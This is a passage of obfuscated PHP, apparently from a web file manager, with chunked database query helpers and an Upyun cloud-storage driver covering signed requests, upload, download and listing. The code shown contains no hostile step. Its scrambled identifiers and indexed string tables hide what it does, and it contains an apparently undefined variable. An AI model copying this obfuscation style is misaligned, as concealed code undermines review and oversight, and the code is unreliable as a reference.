$°åÄ±æ“ . $ÎæÚüÏÄ[220]; $°åÄ±æ“ = str_replace(array($ÎæÚüÏÄ[10], $ÎæÚüÏÄ[476]), $ÎæÚüÏÄ[477], $°åÄ±æ“); if ($œäš¼Ïò[$ÎæÚüÏÄ[478]]) { $„¼§™€ = $ÎæÚüÏÄ[479] . $°åÄ±æ“ . $ÎæÚüÏÄ[480]; if ($œäš¼Ïò[$ÎæÚüÏÄ[481]]) { $„¼§™€ = $ÎæÚüÏÄ[480] . $°åÄ±æ“ . $ÎæÚüÏÄ[479]; } } $Æ¸×şı… = Hook::trigger($ÎæÚüÏÄ[482], $°åÄ±æ“, $„¼§™€); if ($Æ¸×şı…) { $„¼§™€ = $Æ¸×şı…; } $‚ÉŠëş¦[$äˆ“Ûº¸] = $ÎæÚüÏÄ[483] . $Š¬¹É¦ . $ÎæÚüÏÄ[484] . $„¼§™€ . $ÎæÚüÏÄ[485]; $äˆ“Ûº¸++; continue; } if (is_array($¬Û”“»)) { $Û”½Ó Ø = is_string($ÏíèÀíİ) ? $ÏíèÀíİ : $Û”½Ó Ø; $¬Û”“» = $this->parseWhereLike($¬Û”“», $Û”½Ó Ø, !0, $ˆâ¹üüó); } if (is_numeric($ÏíèÀíİ)) { $‚ÉŠëş¦[$äˆ“Ûº¸] = $¬Û”“»; $äˆ“Ûº¸++; } else { $‚ÉŠëş¦[$ÏíèÀíİ] = $¬Û”“»; } } if ($ˆâ¹üüó && !$¼¡Ä§ç®) { } return $‚ÉŠëş¦; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¶ü£ã İ = array()) { $–Òßé±Ğ =& $_SERVER[©—Ò»ÅĞ]; $É³Üú°È = self::SQL_WHERE_IN_CHUNK; $”Ø»¹Ã§ = $this->optionsValue(); $±»‹å“ı = $this->findWhereField($”Ø»¹Ã§); if (!$±»‹å“ı || isset($”Ø»¹Ã§[$–Òßé±Ğ[368]]) || isset($”Ø»¹Ã§[$–Òßé±Ğ[428]])) { return parent::select($¶ü£ã İ); } $ŠÓãŒşÅ = $”Ø»¹Ã§[$–Òßé±Ğ[353]][$±»‹å“ı][1]; $ŠÓãŒşÅ = is_array($ŠÓãŒşÅ) ? $ŠÓãŒşÅ : array(); $³óÆ˜ñ° = null; for ($ñ£Ùê¿± = 0; $ñ£Ùê¿± < count($ŠÓãŒşÅ); $ñ£Ùê¿± += $É³Üú°È) { $ÙÁì¬Ö = array_slice($ŠÓãŒşÅ, $ñ£Ùê¿±, $É³Üú°È); if (!is_array($ÙÁì¬Ö) || count($ÙÁì¬Ö) == 0) { break; } $”Ø»¹Ã§[$–Òßé±Ğ[353]][$±»‹å“ı][1] = $ÙÁì¬Ö; $this->optionsValue($”Ø»¹Ã§); $ĞÊªÜ = parent::select($¶ü£ã İ); if (!$ĞÊªÜ) { continue; } $³óÆ˜ñ° = is_array($³óÆ˜ñ°) ? $³óÆ˜ñ° : array(); $³óÆ˜ñ° = array_merge($³óÆ˜ñ°, $ĞÊªÜ); } return $³óÆ˜ñ°; } public function delete($½Å·ï¸Ò = array()) { $€şÊ—ùÙ =& $_SERVER[©—Ò»ÅĞ]; $÷„êš‹‘ = self::SQL_WHERE_IN_CHUNK; $…Ö¤ÓŞ¤ = $this->optionsValue(); $¿´¢—÷¦ = $this->findWhereField($…Ö¤ÓŞ¤); if (!$¿´¢—÷¦) { return parent::delete($½Å·ï¸Ò); } $î¶¾³Ì = 0; $…³Òøà = $…Ö¤ÓŞ¤[$€şÊ—ùÙ[353]][$¿´¢—÷¦][1]; $…³Òøà = is_array($…³Òøà) ? $…³Òøà : array(); for ($‘Æ ğÜø = 0; $‘Æ ğÜø < count($…³Òøà); $‘Æ ğÜø += $÷„êš‹‘) { $òùĞ®Éü = array_slice($…³Òøà, $‘Æ ğÜø, $÷„êš‹‘); if (!is_array($òùĞ®Éü) || count($òùĞ®Éü) == 0) { break; } $…Ö¤ÓŞ¤[$€şÊ—ùÙ[353]][$¿´¢—÷¦][1] = $òùĞ®Éü; $this->optionsValue($…Ö¤ÓŞ¤); $î¶¾³Ì += parent::delete($½Å·ï¸Ò); } return $î¶¾³Ì; } private function findWhereField($–Ïö†õ) { $·¦”‚Û– =& $_SERVER[©—Ò»ÅĞ]; $õúï³ÑÕ = self::SQL_WHERE_IN_CHUNK; if (!is_array($–Ïö†õ) || !is_array($–Ïö†õ[$·¦”‚Û–[353]])) { return !1; } foreach ($–Ïö†õ[$·¦”‚Û–[353]] as $œè”ö¨Á => $µ˜ÜöıÉ) { if (is_array($µ˜ÜöıÉ) && isset($µ˜ÜöıÉ[0]) && is_string($µ˜ÜöıÉ[0]) && strtolower($µ˜ÜöıÉ[0]) == $·¦”‚Û–[7] && is_array($µ˜ÜöıÉ[1]) && count($µ˜ÜöıÉ[1]) > $õúï³ÑÕ) { ignore_timeout(); return $œè”ö¨Á; } } return !1; } public function setMasterDB($¢€´½Ê = true) { think_config($_SERVER[©—Ò»ÅĞ][486], $¢€´½Ê); } } goto b³Ö¶·¹Ò; Bé§ãÏ†¡„: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\x2f\57\x76\x30\x2e\141\x70\x69\56\165\160\171\x75\x6e\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ùé›éı§) { parent::__construct(); $this->_init($ùé›éı§); } public function _init($˜™İ´ô¾) { $ƒ‹¦ÍÎç =& $_SERVER[©—Ò»ÅĞ]; foreach ($˜™İ´ô¾ as $Ÿê¥«š€ => $ÜÛ¸Â•) { if (isset($this->{$Ÿê¥«š€})) { $this->{$Ÿê¥«š€} = $ÜÛ¸Â•; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ƒ‹¦ÍÎç[1749] . LNG($ƒ‹¦ÍÎç[1672])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Œ¶³åÍ¦, $Ğæıò¡ç = "\x47\x45\x54") { $ÙıÀÔŸ =& $_SERVER[©—Ò»ÅĞ]; $ğ÷Ê°üò = gmdate($ÙıÀÔŸ[1701]); $ğÛãó£¨ = base64_encode(hash_hmac($ÙıÀÔŸ[1750], "{$Ğæıò¡ç}\x26{$Œ¶³åÍ¦}\46{$ğ÷Ê°üò}", md5("{$this->userpass}"), !0)); $û”»Ú°¾ = array("\101\165\x74\x68\x6f\162\x69\x7a\141\164\x69\x6f\x6e\x3a\125\120\x59\125\x4e\40{$this->username}\72{$ğÛãó£¨}", "\x44\x61\164\x65\72{$ğ÷Ê°üò}"); return $û”»Ú°¾; } public function ussRequest($Éà°¸Ç€, $”ÄÛÇ“Ğ = "\107\105\124", $·óëåèˆ = false, $¦ºüƒ—‹ = false, $á£™Ö‚¯ = false) { $‡±‰ßæ£ =& $_SERVER[©—Ò»ÅĞ]; $Éà°¸Ç€ = trim($Éà°¸Ç€, $‡±‰ßæ£[8]); $º²ş¹à« = "\57{$this->bucket}\57" . rawurlencode($Éà°¸Ç€); $Äô¬ü´ = $this->ussHeaders($º²ş¹à«, $”ÄÛÇ“Ğ); if ($¦ºüƒ—‹) { $Äô¬ü´ = array_merge($Äô¬ü´, $¦ºüƒ—‹); } $ú¨®ğ¨Æ = url_request($this->endpoint . $º²ş¹à«, $”ÄÛÇ“Ğ, $·óëåèˆ, $Äô¬ü´, $á£™Ö‚¯); if (!$ú¨®ğ¨Æ) { $îü›…ò© = LNG($‡±‰ßæ£[1751]); $this->writeLog($îü›…ò©); return array($‡±‰ßæ£[1402] => !1, $‡±‰ßæ£[1392] => $îü›…ò©); } if (strtolower($”ÄÛÇ“Ğ) == $‡±‰ßæ£[227] || in_array($ú¨®ğ¨Æ[$‡±‰ßæ£[1402]], array($‡±‰ßæ£[261], $‡±‰ßæ£[1752]))) { $·óëåèˆ = $ú¨®ğ¨Æ[$‡±‰ßæ£[1753]]; if (!$ú¨®ğ¨Æ[$‡±‰ßæ£[850]]) { $·óëåèˆ = isset($·óëåèˆ[0]) ? $·óëåèˆ[0] : $‡±‰ßæ£[12]; } } else { $·óëåèˆ = json_decode($ú¨®ğ¨Æ[$‡±‰ßæ£[1392]], !0); if (!$·óëåèˆ) { $·óëåèˆ = $ú¨®ğ¨Æ[$‡±‰ßæ£[1392]]; } else { if (!$ú¨®ğ¨Æ[$‡±‰ßæ£[850]] && isset($·óëåèˆ[$‡±‰ßæ£[1754]])) { $·óëåèˆ = $·óëåèˆ[$‡±‰ßæ£[1754]]; } } } if (!$ú¨®ğ¨Æ[$‡±‰ßæ£[850]]) { $this->writeLog($this->__errorMessage($·óëåèˆ)); } return array($‡±‰ßæ£[1402] => $ú¨®ğ¨Æ[$‡±‰ßæ£[850]], $‡±‰ßæ£[1392] => $·óëåèˆ); } private function __errorMessage($¥È™¥şç) { $ªŠ÷ ¿ =& $_SERVER[©—Ò»ÅĞ]; if (!$¥È™¥şç) { return $ªŠ÷ ¿[12]; } static $ˆ­‘ÕŸ = null; if (!$ˆ­‘ÕŸ) { $ˆ­‘ÕŸ = I18n::getType(); } if ($ˆ­‘ÕŸ != $ªŠ÷ ¿[1709]) { return $¥È™¥şç; } $œƒ¸²Àò = array($ªŠ÷ ¿[1755] => $ªŠ÷ ¿[1756], $ªŠ÷ ¿[1757] => $ªŠ÷ ¿[1758], $ªŠ÷ ¿[1759] => $ªŠ÷ ¿[1758], $ªŠ÷ ¿[1760] => $ªŠ÷ ¿[1761], $ªŠ÷ ¿[1762] => $ªŠ÷ ¿[1763], $ªŠ÷ ¿[1764] => $ªŠ÷ ¿[1765], $ªŠ÷ ¿[1766] => $ªŠ÷ ¿[1767]); return isset($œƒ¸²Àò[$¥È™¥şç]) ? $œƒ¸²Àò[$¥È™¥şç] : $¥È™¥şç; } public function mkfile($ºí«ùòÕ, $ÑëªÀÆ¨ = '', $¾×–©Üæ = REPEAT_RENAME) { if ($this->setContent($ºí«ùòÕ, $ÑëªÀÆ¨)) { return $this->getPathOuter($ºí«ùòÕ); } return !1; } public function mkdir($Ñ›ŸÌñ¦, $²Û”¾ = REPEAT_SKIP) { $ÍÛ»˜ú¶ =& $_SERVER[©—Ò»ÅĞ]; $Ş÷¢½Â = trim($Ñ›ŸÌñ¦, $ÍÛ»˜ú¶[8]); if ($this->_isFolder($Ş÷¢½Â)) { return $this->getPathOuter($Ş÷¢½Â); } $‰œÌËÈĞ = array($ÍÛ»˜ú¶[1768]); $Ñ¦¬ü¯Õ = $this->ussRequest($Ş÷¢½Â, $ÍÛ»˜ú¶[288], !1, $‰œÌËÈĞ); return $Ñ¦¬ü¯Õ[$ÍÛ»˜ú¶[1402]] ? $this->getPathOuter($Ş÷¢½Â) : !1; } public function copyFile($èË½½™Æ, $²Œ¯«°“) { $¾ÌáµµÙ =& $_SERVER[©—Ò»ÅĞ]; $ğ–¿Ì®µ = array($¾ÌáµµÙ[1769] . "\57{$this->bucket}\57{$èË½½™Æ}", $¾ÌáµµÙ[1770]); $¶ìÏĞ² = $this->ussRequest($²Œ¯«°“, $¾ÌáµµÙ[253], !1, $ğ–¿Ì®µ); return $¶ìÏĞ²[$¾ÌáµµÙ[1402]] ? !0 : $this->getPathOuter($²Œ¯«°“); } public function moveFile($Ö—ÚıïÊ, $µ“ÌÀ¸ë) { $ı«ƒîõÜ =& $_SERVER[©—Ò»ÅĞ]; $ûçÙÂ»û = array($ı«ƒîõÜ[1771] . "\x2f{$this->bucket}\x2f{$Ö—ÚıïÊ}", $ı«ƒîõÜ[1770]); $ ã–ÖÒ = $this->ussRequest($µ“ÌÀ¸ë, $ı«ƒîõÜ[253], !1, $ûçÙÂ»û); return $ ã–ÖÒ[$ı«ƒîõÜ[1402]] ? !0 : $this->getPathOuter($µ“ÌÀ¸ë); } public function delFile($Ş•„£ëè) { $·ˆğŸ”À =& $_SERVER[©—Ò»ÅĞ]; $Üå“·æŠ = $this->ussRequest($Ş•„£ëè, $·ˆğŸ”À[1772]); return $Üå“·æŠ[$·ˆğŸ”À[1402]] ? !0 : !1; } public function delFolder($­’«‹€ˆ) { $¾ Óª•‰ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->exist($­’«‹€ˆ)) { return !0; } $this->listItemCache = !1; $…æ£³Ø¶ = $æ×âò— = array(); $this->fileList($­’«‹€ˆ, $…æ£³Ø¶, $æ×âò—, !0); $this->listItemCache = !0; foreach ($æ×âò— as $î°®í´¡) { $‰˜„††• = $this->ussRequest($î°®í´¡[$¾ Óª•‰[32]], $¾ Óª•‰[1772]); if (!$‰˜„††•[$¾ Óª•‰[1402]]) { return !1; } } usort($…æ£³Ø¶, function ($‰Œ³¬§, $›¯Àó¤§) { $ü¿˜å =& $_SERVER[©—Ò»ÅĞ]; return substr_count($›¯Àó¤§, $ü¿˜å[8]) - substr_count($‰Œ³¬§, $ü¿˜å[8]); }); foreach ($…æ£³Ø¶ as $¢±šâ”) { $‰˜„††• = $this->ussRequest($¢±šâ”, $¾ Óª•‰[1772]); if (!$‰˜„††•[$¾ Óª•‰[1402]]) { return !1; } } $‰˜„††• = $this->ussRequest($­’«‹€ˆ, $¾ Óª•‰[1772]); return $‰˜„††•[$¾ Óª•‰[1402]]; } public function rename($£ü ıµÈ, $Ş›»Ì) { if ($this->isFile($£ü ıµÈ)) { $Ş›»Ì = get_path_father($£ü ıµÈ) . $Ş›»Ì; return $this->moveFile($£ü ıµÈ, $Ş›»Ì); } return $this->renameObject($£ü ıµÈ, $Ş›»Ì); } public function fileInfo($é°ùèı, $§€¥Şë = false, $Œà–ú© = array()) { $ùåÑ©¸å =& $_SERVER[©—Ò»ÅĞ]; $ßëË÷¯ï = array($ùåÑ©¸å[32] => $this->pathThis($é°ùèı), $ùåÑ©¸å[87] => $this->getPathOuter($ùåÑ©¸å[8] . $é°ùèı), $ùåÑ©¸å[33] => $ùåÑ©¸å[230], $ùåÑ©¸å[79] => isset($Œà–ú©[$ùåÑ©¸å[79]]) ? $Œà–ú©[$ùåÑ©¸å[79]] : 0, $ùåÑ©¸å[166] => $this->ext($é°ùèı)); if ($§€¥Şë) { return $ßëË÷¯ï; } $ßëË÷¯ï[$ùåÑ©¸å[231]] = $ßëË÷¯ï[$ùåÑ©¸å[88]] = 0; $ßëË÷¯ï[$ùåÑ©¸å[232]] = $ßëË÷¯ï[$ùåÑ©¸å[233]] = !0; if (empty($Œà–ú©)) { $Œà–ú© = $this->objectMeta($é°ùèı); if (!$Œà–ú©) { return $ßëË÷¯ï; } } $ßëË÷¯ï[$ùåÑ©¸å[231]] = intval($Œà–ú©[$ùåÑ©¸å[1773]]); $ßëË÷¯ï[$ùåÑ©¸å[88]] = intval($Œà–ú©[$ùåÑ©¸å[1774]]); $ßëË÷¯ï[$ùåÑ©¸å[79]] = $Œà–ú©[$ùåÑ©¸å[79]]; return $ßëË÷¯ï; } public function folderInfo($ÎŸ…ÅÆÄ, $µç´³½Ç = false) { $¸ª¼Ù— =& $_SERVER[©—Ò»ÅĞ]; $™ıÍªµí = array($¸ª¼Ù—[32] => $this->pathThis($ÎŸ…ÅÆÄ), $¸ª¼Ù—[87] => $this->getPathOuter($¸ª¼Ù—[8] . $ÎŸ…ÅÆÄ), $¸ª¼Ù—[33] => $¸ª¼Ù—[78]); if ($µç´³½Ç) { return $™ıÍªµí; } $™ıÍªµí[$¸ª¼Ù—[231]] = $™ıÍªµí[$¸ª¼Ù—[88]] = 0; $™ıÍªµí[$¸ª¼Ù—[232]] = $™ıÍªµí[$¸ª¼Ù—[233]] = !0; if (empty($ûºñ‰Ç£)) { $ûºñ‰Ç£ = $this->objectMeta($ÎŸ…ÅÆÄ); if (!$ûºñ‰Ç£) { return $™ıÍªµí; } } $™ıÍªµí[$¸ª¼Ù—[231]] = intval($ûºñ‰Ç£[$¸ª¼Ù—[1773]]); $™ıÍªµí[$¸ª¼Ù—[88]] = intval($ûºñ‰Ç£[$¸ª¼Ù—[1774]]); return $™ıÍªµí; } private function listObjs($¹â‡Åâ×, $°ÎÇçÛá = 0, $×™›Œ¬ç = 1000) { $÷äşè‰ó =& $_SERVER[©—Ò»ÅĞ]; $Œş æÈ = array($÷äşè‰ó[1775], $÷äşè‰ó[1776] . $×™›Œ¬ç); if ($°ÎÇçÛá) { $Œş æÈ[] = $÷äşè‰ó[1777] . $°ÎÇçÛá; } $Êçã‰Øæ = $this->ussRequest($¹â‡Åâ×, $÷äşè‰ó[1605], !1, $Œş æÈ); return !$Êçã‰Øæ[$÷äşè‰ó[1402]] ? !1 : $Êçã‰Øæ[$÷äşè‰ó[1392]]; } private function fileList($ÒøØ»£˜, &$èÃïÆ§, &$šÉ×æ…´, $Â§¨¤ = false) { $ª”ßš„˜ =& $_SERVER[©—Ò»ÅĞ]; $Åö†¾·À = $ª”ßš„˜[12]; $ç¬ûï¥ù = 1000; $Ÿ¡Áá¹¦ = rtrim($ÒøØ»£˜, $ª”ßš„˜[8]) . $ª”ßš„˜[8]; while (!0) { check_abort(); $ó…Ù›È = $this->listObjs($ÒøØ»£˜, $Åö†¾·À, $ç¬ûï¥ù); if (!$ó…Ù›È) { return !1; } $Åö†¾·À = isset($ó…Ù›È[$ª”ßš„˜[1778]]) ? $ó…Ù›È[$ª”ßš„˜[1778]] : $ª”ßš„˜[12]; $ÛŞ—ı = isset($ó…Ù›È[$ª”ßš„˜[1779]]) ? $ó…Ù›È[$ª”ßš„˜[1779]] : array(); foreach ($ÛŞ—ı as $ÏÆıš¬°) { $Ÿ—ğÏÊÊ = $ÏÆıš¬°[$ª”ßš„˜[33]] == $ª”ßš„˜[78] ? !0 : !1; $Î¢ˆô›’ = ltrim($Ÿ¡Áá¹¦ . $ÏÆıš¬°[$ª”ßš„˜[32]], $ª”ßš„˜[8]) . ($Ÿ—ğÏÊÊ ? $ª”ßš„˜[8] : $ª”ßš„˜[12]); $µ¦Í„ = array($ª”ßš„˜[32] => $Î¢ˆô›’, $ª”ßš„˜[33] => $Ÿ—ğÏÊÊ ? $ª”ßš„˜[78] : $ª”ßš„˜[230], $ª”ßš„˜[79] => $ÏÆıš¬°[$ª”ßš„˜[412]], $ª”ßš„˜[1774] => $ÏÆıš¬°[$ª”ßš„˜[1780]]); $this->cacheMethodInfoSet($Î¢ˆô›’, $Ÿ—ğÏÊÊ, $µ¦Í„); if ($Ÿ—ğÏÊÊ) { $èÃïÆ§[] = $Î¢ˆô›’; if ($Â§¨¤) { $this->fileList($Î¢ˆô›’, $èÃïÆ§, $šÉ×æ…´, $Â§¨¤); } continue; } $šÉ×æ…´[] = $µ¦Í„; } if (count($ÛŞ—ı) < $ç¬ûï¥ù) { break; } } $this->cacheMethodInfoSet($ÒøØ»£˜, !0); } public function listPath($ã¸Æ¯™³, $¼ˆö¥æ = false) { $ºá ¡ş… =& $_SERVER[©—Ò»ÅĞ]; $ê‘Í“œá = $ê®çÉ—õ = array(); $this->fileList($ã¸Æ¯™³, $ê‘Í“œá, $ê®çÉ—õ); foreach ($ê‘Í“œá as $ÁÚ»Ò›• => $·ÔĞ¿ºØ) { $ê‘Í“œá[$ÁÚ»Ò›•] = $this->folderInfo($·ÔĞ¿ºØ, $¼ˆö¥æ); } foreach ($ê®çÉ—õ as $ÁÚ»Ò›• => $·ÔĞ¿ºØ) { $ê®çÉ—õ[$ÁÚ»Ò›•] = $this->fileInfo($·ÔĞ¿ºØ[$ºá ¡ş…[32]], $¼ˆö¥æ, $·ÔĞ¿ºØ); } return array($ºá ¡ş…[85] => $ê‘Í“œá, $ºá ¡ş…[86] => $ê®çÉ—õ); } public function has($Ÿ€éÊÆ, $¸€ÔÍ¡ò = false, $ÂÂÄ… = true) { $õ„ôÙÂÄ =& $_SERVER[©—Ò»ÅĞ]; $²õïĞË = $õ„ôÙÂÄ[12]; $³ö†‘³ƒ = 500; $”˜Ü˜âÁ = 0; $ÌØÎˆÙ· = 0; $¢˜¤ıË = rtrim($Ÿ€éÊÆ, $õ„ôÙÂÄ[8]) . $õ„ôÙÂÄ[8]; while (!0) { check_abort(); $ÁŞàÛÌø = $this->listObjs($Ÿ€éÊÆ, $²õïĞË, $³ö†‘³ƒ); if (!$ÁŞàÛÌø) { return !1; } $²õïĞË = isset($ÁŞàÛÌø[$õ„ôÙÂÄ[1778]]) ? $ÁŞàÛÌø[$õ„ôÙÂÄ[1778]] : $õ„ôÙÂÄ[12]; $ğ½‹İƒ¬ = isset($ÁŞàÛÌø[$õ„ôÙÂÄ[1779]]) ? $ÁŞàÛÌø[$õ„ôÙÂÄ[1779]] : array(); if (empty($ğ½‹İƒ¬)) { break; } $—é­õÎ« = array_filter($ğ½‹İƒ¬, function ($ùö·—²ó) { $Ç¤ÇÔÑà =& $_SERVER[©—Ò»ÅĞ]; return $ùö·—²ó[$Ç¤ÇÔÑà[33]] == $Ç¤ÇÔÑà[78]; }); $÷œıÜÚâ = count($ğ½‹İƒ¬); $—é­õÎ« = count($—é­õÎ«); $ÅÉîï‘Ô = $÷œıÜÚâ - $—é­õÎ«; if ($¸€ÔÍ¡ò) { $ÌØÎˆÙ· += $—é­õÎ«; $”˜Ü˜âÁ += $ÅÉîï‘Ô; if ($÷œıÜÚâ < $³ö†‘³ƒ) { break; } continue; } if ($ÂÂÄ…) { if ($ÅÉîï‘Ô) { return !0; } } else { if ($—é­õÎ«) { return !0; } } if ($÷œıÜÚâ < $³ö†‘³ƒ) { break; } } if ($¸€ÔÍ¡ò) { return array($õ„ôÙÂÄ[239] => $”˜Ü˜âÁ, $õ„ôÙÂÄ[240] => $ÌØÎˆÙ·); } return !1; } public function listAll($·´‰ü’) { $ŠñµÆã =& $_SERVER[©—Ò»ÅĞ]; $Ì°©É¤Ñ = $ãœŞ¯‰ = array(); $this->fileList($·´‰ü’, $Ì°©É¤Ñ, $ãœŞ¯‰, !0); $õØŒ“Á = array_to_keyvalue($ãœŞ¯‰, $ŠñµÆã[32]); foreach ($Ì°©É¤Ñ as $‹øóú÷À) { if (is_string($‹øóú÷À)) { $õØŒ“Á[$‹øóú÷À] = array($ŠñµÆã[79] => 0); } } return $this->listAllFiles($·´‰ü’, $õØŒ“Á); } public function canRead($¬İà²á¦) { return $this->exist($¬İà²á¦) ? !0 : !1; } public function canWrite($ïÄÌŠğ) { return $this->exist($ïÄÌŠğ) ? !0 : !1; } public function getContent($ ŠíÓì) { return $this->fileSubstr($ ŠíÓì, 0, -1); } public function setContent($³í¡®Ğø, $•æù§¥ß = '') { $Î°Å°› =& $_SERVER[©—Ò»ÅĞ]; if (!$•æù§¥ß) { $‰ÄÖÍèÅ = $this->ussRequest($³í¡®Ğø, $Î°Å°›[288]); return $‰ÄÖÍèÅ[$Î°Å°›[1402]]; } $Şã­‚·¥ = $this->tempFile($this->pathThis($³í¡®Ğø)); file_put_contents($Şã­‚·¥, $•æù§¥ß); if ($this->upload($³í¡®Ğø, $Şã­‚·¥)) { $this->tempFileRemve($Şã­‚·¥); return !0; } return !1; } public function fileSubstr($±õäÀ–Ú, $ã€Î©…, $È¿ÓÆéë) { $üƒö¬ÍÄ =& $_SERVER[©—Ò»ÅĞ]; if (!($Çîˆ¦Û™ = $this->link($±õäÀ–Ú))) { return !1; } $ú°¾ïâÉ = !1; if ($È¿ÓÆéë > 0) { $äŸñÓº = $ã€Î©… + $È¿ÓÆéë - 1; $ú°¾ïâÉ = array($üƒö¬ÍÄ[1604] . $ã€Î©… . $üƒö¬ÍÄ[476] . $äŸñÓº); } $ˆØ”õ‡¬ = url_request($Çîˆ¦Û™, $üƒö¬ÍÄ[1605], !1, $ú°¾ïâÉ); return $ˆØ”õ‡¬[$üƒö¬ÍÄ[850]] ? $ˆØ”õ‡¬[$üƒö¬ÍÄ[1392]] : !1; } public function upload($¦ÇÜŞÄ, $¨¼ÓÊùå, $±Á™ôÇ = false, $®Åğ”È™ = REPEAT_REPLACE) { $¾ºĞÍ¤Ï =& $_SERVER[©—Ò»ÅĞ]; if (!$¨¼ÓÊùå || !@file_exists($¨¼ÓÊùå)) { return !1; } $»êĞ„ÀÃ = IO::size($¨¼ÓÊùå); if ($»êĞ„ÀÃ <= 1024 * 1024 * 200) { $èÔ»´À¸ = array($¾ºĞÍ¤Ï[1781] . $¨¼ÓÊùå); $’ƒë¡şê = $this->ussRequest($¦ÇÜŞÄ, $¾ºĞÍ¤Ï[253], $èÔ»´À¸); return $’ƒë¡şê[$¾ºĞÍ¤Ï[1402]] ? $this->getPathOuter($¦ÇÜŞÄ) : !1; } $±åşÄ˜ = 1024 * 1024 * 10; $íàÃˆÚ = array($¾ºĞÍ¤Ï[1782], $¾ºĞÍ¤Ï[1783] . $»êĞ„ÀÃ, $¾ºĞÍ¤Ï[1784], $¾ºĞÍ¤Ï[1785] . $±åşÄ˜); $’ƒë¡şê = $this->ussRequest($¦ÇÜŞÄ, $¾ºĞÍ¤Ï[253], !1, $íàÃˆÚ); if (!$’ƒë¡şê[$¾ºĞÍ¤Ï[1402]]) { return !1; } $ø×ˆò›€ = $’ƒë¡şê[$¾ºĞÍ¤Ï[1392]]; $ÆÁóıÖ´ = 0; $¼úİ‘µš = $ø×ˆò›€[$¾ºĞÍ¤Ï[1786]]; $ Ä»ÍœÂ = fopen($¨¼ÓÊùå, $¾ºĞÍ¤Ï[1666]); if (!$ Ä»ÍœÂ) { return !1; } do { $ÅşÇÕæ› = $ø×ˆò›€[$¾ºĞÍ¤Ï[1787]]; fseek_64($ Ä»ÍœÂ, $ÆÁóıÖ´); $Ã¥¸İÆ‡ = fread($ Ä»ÍœÂ, $ÅşÇÕæ›); $ĞµïÃ¯ = 0; do { $ĞµïÃ¯++; $ø×ˆò›€ = $this->uploadPart($¦ÇÜŞÄ, $ø×ˆò›€, $Ã¥¸İÆ‡); } while (!$ø×ˆò›€ && $ĞµïÃ¯ < 3); if (!$ø×ˆò›€) { return !1; } $¼úİ‘µš = $ø×ˆò›€[$¾ºĞÍ¤Ï[1786]]; $ÆÁóıÖ´ += $ÅşÇÕæ›; } while ($¼úİ‘µš != -1); fclose($ Ä»ÍœÂ); $íàÃˆÚ = array($¾ºĞÍ¤Ï[1788], $¾ºĞÍ¤Ï[1789] . $ø×ˆò›€[$¾ºĞÍ¤Ï[1790]], $¾ºĞÍ¤Ï[1784]); $’ƒë¡şê = $this->ussRequest($¦ÇÜŞÄ, $¾ºĞÍ¤Ï[253], !1, $íàÃˆÚ); return $’ƒë¡şê[$¾ºĞÍ¤Ï[1402]] ? $this->getPathOuter($Ù¹€íÃ») : !1; } private function uploadPart($Ğü™©À, $ÎÉÕè è, &$¾í‘Èîá) { $Åµîµô =& $_SERVER[©—Ò»ÅĞ]; $àúçµÀ = array($Åµîµô[1791], $Åµîµô[1789] . $ÎÉÕè è[$Åµîµô[1790]], $Åµîµô[1792] . $ÎÉÕè è[$Åµîµô[1786]], $Åµîµô[143] . $ÎÉÕè è[$Åµîµô[1787]]); $òíœ‚ÌÏ = $this->ussRequest($Ğü™©À, $Åµîµô[253], $¾í‘Èîá, $àúçµÀ); return !$òíœ‚ÌÏ[$Åµîµô[1402]] ? $òíœ‚ÌÏ[$Åµîµô[1402]] : $òíœ‚ÌÏ[$Åµîµô[1392]]; } public function uploadFormData($üŸšË¼¯, $Ìóˆ»€ = 3600) { return $this->uploadPolicy($üŸšË¼¯, $Ìóˆ»€); } public function uploadMultiData($¢œ­åè¦, $“±öˆµ = 3600) { $¥œ‹ã‰ =& $_SERVER[©—Ò»ÅĞ]; $Ø¼–Û±Š = (int) $GLOBALS[$¥œ‹ã‰[7]][$¥œ‹ã‰[79]]; return $this->uploadPolicy($¢œ­åè¦, $“±öˆµ, $Ø¼–Û±Š); } private function uploadPolicy($áŸÄíëÎ, $ê÷ğ’§Ú = 3600, $ÌÃ‰íÁÉ = 0) { $¶Ü¢Œ‚ =& $_SERVER[©—Ò»ÅĞ]; $«¤­èµâ = $¶Ü¢Œ‚[8] . $this->bucket; $Ä‰—Ğù = gmdate($¶Ü¢Œ‚[1701]); $¤üŞ¶å• = array($¶Ü¢Œ‚[1793] => $this->bucket, $¶Ü¢Œ‚[1794] => $áŸÄíëÎ, $¶Ü¢Œ‚[1795] => time() + $ê÷ğ’§Ú, $¶Ü¢Œ‚[1796] => $Ä‰—Ğù); if ($ÌÃ‰íÁÉ) { $¤üŞ¶å•[$¶Ü¢Œ‚[1686]] = $ÌÃ‰íÁÉ; } $¤Õà›¸ª = base64_encode(json_encode($¤üŞ¶å•)); $‹â©ıí = base64_encode(hash_hmac($¶Ü¢Œ‚[1750], "\120\117\123\x54\46{$«¤­èµâ}\46{$Ä‰—Ğù}\x26{$¤Õà›¸ª}", md5("{$this->userpass}"), !0)); $¹‚ı†ç¹ = array($¶Ü¢Œ‚[277] => $¤Õà›¸ª, $¶Ü¢Œ‚[1797] => "\x55\x50\131\x55\x4e\40{$this->username}\x3a{$‹â©ıí}", $¶Ü¢Œ‚[206] => $this->endpoint . $«¤­èµâ); return $¹‚ı†ç¹; } public function download($Í°úï†Æ, $˜×ƒé¼) { $ˆ·š¢”õ = IO::getPathInner(IO::mkfile($˜×ƒé¼)); if (!($’Ñ€ éˆ = $this->link($Í°úï†Æ))) { return !1; } $›ÑËŞ­ = 0; $¼…÷Çƒñ = 1024 * 200; $ñ˜Ñ·Ï = fopen($ˆ·š¢”õ, $_SERVER[©—Ò»ÅĞ][1745]); while (!0) { $¬²äêë¤ = $this->fileSubstr($Í°úï†Æ, $›ÑËŞ­, $¼…÷Çƒñ); if ($¬²äêë¤ === !1) 